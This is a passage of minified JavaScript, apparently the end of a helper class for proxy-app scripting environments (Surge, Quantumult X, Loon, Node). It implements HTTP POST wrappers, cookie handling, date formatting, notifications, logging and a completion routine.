s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}